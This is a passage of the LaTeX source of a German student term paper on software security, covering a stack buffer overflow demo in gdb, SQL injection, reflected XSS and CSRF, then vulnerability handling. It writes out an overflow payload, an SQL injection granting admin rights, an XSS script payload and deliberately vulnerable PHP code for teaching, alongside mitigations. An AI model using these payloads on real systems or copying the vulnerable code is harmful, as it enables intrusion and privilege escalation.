Um den Aufwand einer manuellen Modifikation der Speicheradresse möglichst gering zu halten, kann man den Vorgang mit der \texttt{Perl} automatisieren:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) run `perl -e 'print "A"x72 . "\x0c\x06\x40"'`
String: AAAAAAAAAAAAAAAAAAAAAAAAA ... AAAAAA@
PWND!
[Inferior 1 (process 1624) exited normally]
(gdb)
\end{lstlisting}

Dabei werden insgesamt \SI{72}{Byte} mit dem Zeichen \texttt{A} überschrieben und \SI{3}{Byte} mit hexadezimalen Werten:

\begin{itemize}
      \item \SI{64}{Byte} Speicherplatz der \texttt{data}-Variablen    
      \item \SI{8}{Byte} Basepointer
      \item \SI{3}{Byte} Rücksprungadresse unter Berücksichtigung der Byteorder (Little-Endian)
\end{itemize}

\textbf{Hinweis:}

Wird zur Nachstellung des Beispiels ein veralteter \texttt{gcc}-Compiler in der Version 3.x\footnote{http://www.trapkit.de/papers/gcc\_stack\_layout\_v1\_20030830.pdf} verwendet, ist es möglich, dass dieses Beispiel nicht funktioniert!
\subsection{Webbasierte Schwachstellen}

In den folgenden Kapiteln werden typische webbasierte Schwachstellen und mögliche Maßnahmen zu deren Behebung beschrieben.
Im aktuellsten Report (Draft 2013) des Open Web Application Security Project (OWASP), einer Non-Profit Organisation die sich zum Ziel gesetzt hat die Sicherheit von Webanwendungen zu verbessern, werden die folgenden TOP 10 Bedrohungen bei der Entwicklung von Webanwendungen aufgeführt:


\subsubsection{Injection-Schwachstellen}

Zur dieser Schachstellenkategorie zählen typischerweise SQL-, LDAP- oder XPath-Injections. Diese Schwachstellen treten bei Anwendungen auf, die nicht vertrauenswürdige Eingaben (z.B. durch einen Anwender) nicht ausreichend prüfen.
\\
\textbf{Beispiel:}
\\
Eine Applikation verfügt über eine Suchfunktion, die es einen Anwender ermöglicht, über ein Suchformaluar nach Benutzer-IDs
zu suchen. Die Suche ist über das Suchformular "suche.php" realisiert
\\
\textbf{URL:} http://www.beliebigedomain.de/suche.php?id=4711
\\
\textbf{Erzeugtes SQL-Statement:}
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
SELECT benutzer, email FROM users WHERE id=4711;
\end{lstlisting}
Da die Anwendung den Wert des Übergabeparameters "id" nicht ausreichend validiert, kann ein Angreifer das SQL-Statement beliebig erweitern:
\\
\textbf{URL:} http://www.beliebigedomain.de/suche.php?id=4711; UPDATE users SET\\isAdmin=1 WHERE id=235;
\\
\textbf{Erzeugtes SQL-Statement:}
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
SELECT benutzer, email FROM users WHERE id=4711; 
UPDATE users SET isAdmin=1 WHERE id=235;
\end{lstlisting}

\textbf{Maßnahmen}
\\
Um Anwendungen vor Injection-Schwachstellen zu schützen, empfiehlt es sich neben einer serverseitigen Validierung aller Eingabeparameter und deren Prüfung auf kritische Zeichenketten wie beispielsweise Anführungszeichen oder Semikolon, bereits im Entwicklungsprozess regelmäßig statische Quellcode-Analyse durchzuführen.

\subsubsection{Cross Site Scripting-Schwachstellen}

Cross-Site-Scripting-Schwachstellen ähneln stark Injection-Schwachstellen. Die Schwachstellen basieren, ähnlich klassischer Injection-Schwachstellen auf einer unzureichenden Eingabevalidierung. Bei dieser Schwachstellenkategorie wird HTML– oder JavaScript-Code in den Browser des Anwendungsnutzers "injecteted". 

Die eigentliche Anwendung ist nur indirekt von dieser Schwachstelle betroffen, das eigentliche Ziel ist ein Anwender der betroffenen Applikation. Cross-Site-Scripting-Schwachstellen lassen sich generell in zwei beiden Arten unterscheiden:

\minisec{Persistentes Cross-Site-Scripting}

Bei persistentem Cross-Site Scripting wird der applikationsfremde JavaScript-Code dauerhaft in der verwundbaren Anwendung platziert. Besucht ein Nutzer eine Seite, in der dieser Code eingebettet ist, wird er ohne weitere Interaktion des Benutzers übertragen und in dessen Browser interpretiert bzw. ausgeführt.

\minisec{Nicht-persistentes Cross-Site-Scripting }

Bei nicht-persistentem Cross-Site Scripting (auch reflexives Cross-Site-Scripting genannt) muss der JavaScript-Code dagegen mit jeder Anfrage an die Anwendung übertragen werden. Dies kann ein Angreifer beispielsweise dadurch erreichen, indem er dem Opfer eine E-Mail zustellt, die einen Link mit entsprechend präparierten Parameterwerten enthält.

\textbf{Beispiel: Reflektives Cross-Site-Scripting}

Der folgende Beispielscode gibt den Wert des Parameters \texttt{msg} auf au einer Webseite aus:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
<html>
<body>
<h1>Beispiel: Ausgabe des GET-Parameters "msg"</h1>
<br>
<?
echo 'String: '. $_GET["msg"];
?>
</body>
</html>
\end{lstlisting}

\textbf{URL:} http://domain.de/FUH/msg.php?msg=das+ist+ein+beispiel

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.75]{abbildungen/xss_1}
 \caption{Ausgabe des eines Beispiel-Strings}
 \label{fig:xss_1} 
\end{figure}

Da im Beispiel keine serverseitige Validierung des Parameters „msg“ vorgenommen wird, ist der Parameter anfällig für Corss-Site-Scripting.
Wird an die URL aus dem vorhergehenden Beispiel JavaScript Code angehängt, wird der Code vom Browser des Anwenders interpretiert und ausgeführt.
\\
\textbf{URL:} http://domain.de/FUH/msg.php?msg=das+ist+ein+beispiel\\<script>alert('XSS')</script>

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.75]{abbildungen/xss_2}
 \caption{Der JavaScript-Code kommt im Browser zu Ausführung}
 \label{fig:xss_1} 
\end{figure}

Betrachtet man den Quellcode der Webseite, erkennt man den eingebetteten JavaScript-Code:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
<html>
<body>
<h1>Beispiel: Ausgabe des GET-Parameters "msg"</h1>
<br>
String: das ist ein beispiel<script>alert('XSS')</script></body>
</html>
\end{lstlisting}

\subsubsection{Cross Site Request Forgery}
Bei Cross-Site Request Forgery handelt es sich um eine Angriffstechnik, mit der Daten in der Anwendung unberechtigt verändert werden können. Dabei bringt ein Angreifer den Webbrowser eines bereits authentisierten Benutzers dazu, eine HTTP-Anfrage an die Webanwendung zu stellen. Der Angreifer wählt diese Anfrage so, dass die Webanwendung die ihm gewünschte Funktion (z.B. eine Passwortänderung) ausführt. Sofern das Opfer angemeldet ist und somit bereits über eine gültige Session verfügt, während die HTTP-Anfrage ausgeführt wird, nimmt die Webanwendung die Anfrage entgegen und führt sie mit den Rechten des Opfers aus.

Die Webanwendung kann dabei nicht zwischen HTTP-Anfragen unterscheiden, die korrekt durch den Benutzer initiiert wurde und solchen, die durch CSRF in den Browser des Opfers eingeschleust wurden. Da der Angriff ausschließlich im Webbrowser des Opfers stattfindet und der Angreifer selbst weder aktiv noch passiv mit der Webanwendung interagiert, ist dieser Angriff unmittelbar nur zum Manipulieren von Daten geeignet. Daten direkt auszulesen bzw. mitzulesen ist nicht möglich. Um eine CSRF-Schwachstelle ausnutzen zu können, müssen einige Vorbedingungen erfüllt sein:


\begin{itemize}
      \item Die Webanwendung muss anfällig für CSRF sein
	  \item Das Opfer muss an der Applikation angemeldet sein
	  \item Das Opfer muss dazu gebracht werden, eine HTTP-Anfrage abzusetzen (beispielsweise durch Anklicken eines manipulierten Links
\end{itemize}

Eine Webanwendung ist  anfällig für CSRF, wenn Anfragen an den Webserver statisch sind und keine zufällige Komponente (Token) beinhalten. In diesem Fall können die Anfragen vorab konstruiert und direkt an den Webserver geschickt werden, ohne dass man zuvor die eigentlichen Formulare der Applikation ausgefüllt haben muss.
Im Folgenden ist exemplarisch eine CSRF-Schwachstelle innerhalb der Applikation beschrieben.



%%%%%%%%%%%%%%%%% Kapitel 4 %%%%%%%%%%%%%%%%%% 
\newpage
\thispagestyle{fancy} 
\fancyhead[L]{} %Kopfzeile links
% Kirsten
\section{Umgang mit Sicherheitslücken}
Wie geht man mit bekannt werden von einem Sicherheitslücken in Software um?

Bisher wurde beschrieben, welche Arten von Sicherheitslücken es gibt und 
wie man Code aktuell wirkungsvoll davor schützt bzw. aktuelle Lösungswege 
um sie zu vermeiden.

In den meisten Fällen kann man bei bekannt werden von Sicherheitslücken
diese beseitigen und ein Update bereitstellen.
Was aber passiert eigentlich mit Code der eine Sicherheitslücke hat die
kritisch ist, aber nicht zeitnahe aktualisiert werden kann?

Aktuell gibt es zahlreiche solcher bekannten Sicherheitslücken. Der wohl 
bekannteste Hacker im Dienste des "Guten" ist der Sicherheitsexperte 
Barnaby Jack der zu den sogenannten \textit{white hats} zählte. Er starb 
letzte Woche an noch ungeklärter Ursache im Alter von 35 Jahren
\footnote{http://www.spiegel.de/netzwelt/web/hacker-barnaby-jack-in-san-francisco-gestorben-a-913380.html}. 
Eine Woche bevor er auf einer Konferenz über die Sicherheit von 
Herzschrittmachern sprechen wollte.
In den Medien sorgt aber aktuell auch noch ein weiterer Fall für Schlagzeilen.
Dabei geht es um geknackte Wegfahsperrcodes
\footnote{http://www.spiegel.de/auto/aktuell/volkswagen-erwirkt-verfuegung-gegen-akademische-codeknacker-a-913462.html} 
bei den Luxusmarken der Volkswagen Gruppe (VW).
Hier wurde von VW kurzfristig eine Verfügung veranlasst, die dem Wissenschaftler
eine Veröffentlichung untersagt.

Beide dieser Beispielfälle zeigen Sicherheitslücken in Systemen, die
nur schwer aktualisiert werden können. 
Die Softwareentwicklung bei einem Herzschrittmacher benötigt viele
Tests und einen Langzeittest um sicher zu stellen, dass durch ein Update
nicht eine Fehlfunktion zum Herzstillstand des Patienten führt. 
Bei VW muss jetzt jeder betroffene Wagen in eine Werkstatt um mit neuer
Software ausgestattet zu werden, da man nicht einfach das Update über 
eine Datenleitung einspielen kann. 
Zwar gibt es immer mehr Systeme die eine Anbindung an das Internet haben,
so\footnote{http://www.n-tv.de/ratgeber/Sendungen/Wenn-nicht-nur-der-Kuehlschrank-online-ist-article10431986.html}
doch bringt dieses nicht nur Vorteile, da gerade die globale Erreichbarkeit
neue Sicherheitsprobleme hervorruft.  
Für Hersteller ist nicht nur die Fehlerbehebung und die Tests mit 
kosten verbunden, sondern auch eine eventuelle Rufschädigung. So versuchen
gerade große Konzerne, die Hacker ihrer Systeme als Sicherheitsexperten 
zu gewinnen.



%%%%%%%%%%%%%%%%% Kapitel 5 %%%%%%%%%%%%%%%%%% 
\newpage
\thispagestyle{fancy} 
\fancyhead[L]{} %Kopfzeile links
% Kirsten
\section{Fazit}
Durch die globalisierte Vernetzung nimmt die Sicherheit in der 
Softwareentwicklung einen immer größeren Stellenwert ein. In den 
vergangenen Jahren ist die Komplexität mit jeder neu entstandenen 
Software gestiegen. 
\newline

%~ \textit{„Wann haben Sie zuletzt Ihren Smart-Fernseher aktualisiert?“} 
%~ \begin{flushright}
%~ Marc Rogers, US-Sicherheitsforscher
%~ \end{flushright} 
%~ \newline

Obwohl Sicherheitslücken wie SQL-Injection und Cross-Site Scripting (XSS), 
wie in dieser Hausarbeit beschrieben, schon seit Jahren bekannt sind und 
effektiv bekämpft werden können, liest man noch heute immer wieder über diese 
Schwachstellen. Inzwischen gibt es eigene Firmen, die bezahlt werden, um 
Sicherheitslücken zu finden und damit das Softwareprodukt sicherer zu 
machen. Doch durch die stetige Weiterentwicklung und neuen Möglichkeiten
entstehen wiederum neue Sicherheitslücken.
Auch wenn eine Schwachstelle behoben wurde bedeutet dieses nicht gleich, 
dass alle betroffenen Systeme von der Behebung profitieren.
Ein bekanntes Beispiel sind Content Managment Systeme, die von
Administratoren oft nur schlecht gewartet werden. So gibt es Schätzungen,
das heute nur ca. 50\% aller Wordpress-Installationen \cite{playground_wordpress} %\footnote{\url{http://playground.ebiene.de/wordpress-versionen-verteilung/}}
aktuell sind. Sicherheitsexperten gehen sogar aufgrund der stetigen
Entwicklung von Hardware und Softwarekomplexitäten davon aus, dass 
nach einem Jahr ohne Aktualisierungen eine Software hochgradig
anfällig für Schwachstellen ist.
Auch der gerne benutzte Punkt "Sicherheit durch Unbekanntheit" 
kann nicht genutzt werden. Gerade in Zeiten von Spionage untersuchen
Hacker Webseiten auf Auffälligkeiten.
 
Daher müssen sich nicht nur Entwickler mit der ständigen Weiterentwicklung 
auseinandersetzen, sondern auch die Nutzer dieser Software selbst. 
Auch wenn gleich es inzwischen viele Hilfsprogramme gibt, die nachschauen 
ob es eine neuere Version gibt, so muss schlussendlich doch auch der 
Nutzer tätig werden, um das Update durchzuführen.   



\onecolumn
% einfacher Zeilenabstand
\singlespacing
% Literaturliste soll im Inhaltsverzeichnis auftauchen
\newpage
\addcontentsline{toc}{section}{Literaturverzeichnis}
% Literaturverzeichnis anzeigen
\renewcommand\refname{Literaturverzeichnis}
\bibliography{Hauptdatei}

% Abstract
\newpage
\fancyhead[L]{Abstract} %Kopfzeile links
\section*{Zusammenfassung}


%\begin{verbatim}

%

%\end{verbatim}

\section*{Abstract}


% evtl. Anhang
\newpage
\addcontentsline{toc}{section}{Anhang}
\fancyhead[L]{Anhang} %Kopfzeile links
\input{anhang}

\newpage
% Listingverzeichnis soll im Inhaltsverzeichnis auftauchen
\addcontentsline{toc}{section}{Listingverzeichnis}
\fancyhead[L]{Abbildungs- / Tabellen- / Listingverzeichnis} %Kopfzeile links
\renewcommand{\lstlistlistingname}{Listingverzeichnis}
\lstlistoflistings
%%%%


% das Abbildungsverzeichnis
\newpage
% Abbildungsverzeichnis soll im Inhaltsverzeichnis auftauchen
\addcontentsline{toc}{section}{Abbildungsverzeichnis}
\fancyhead[L]{Abbildungsverzeichnis} %Kopfzeile links
% Abbildungsverzeichnis endgueltig anzeigen
\listoffigures

% das Tabellenverzeichnis
\newpage
% Abbildungsverzeichnis soll im Inhaltsverzeichnis auftauchen
\addcontentsline{toc}{section}{Tabellenverzeichnis}
\fancyhead[L]{Tabellenverzeichnis} %Kopfzeile links
% \fancyhead[L]{Abbildungsverzeichnis / Abkürzungsverzeichnis} %Kopfzeile links
% Abbildungsverzeichnis endgueltig anzeigen
\listoftables

%%%%%%%%%%%%%%%%% Eidesstattliche Erklärung %%%%%%%%%%%%%%%%%% 
\thispagestyle{fancy} 
\include{erklaerung}

\end{document}  % beendet das Schriftstueck 
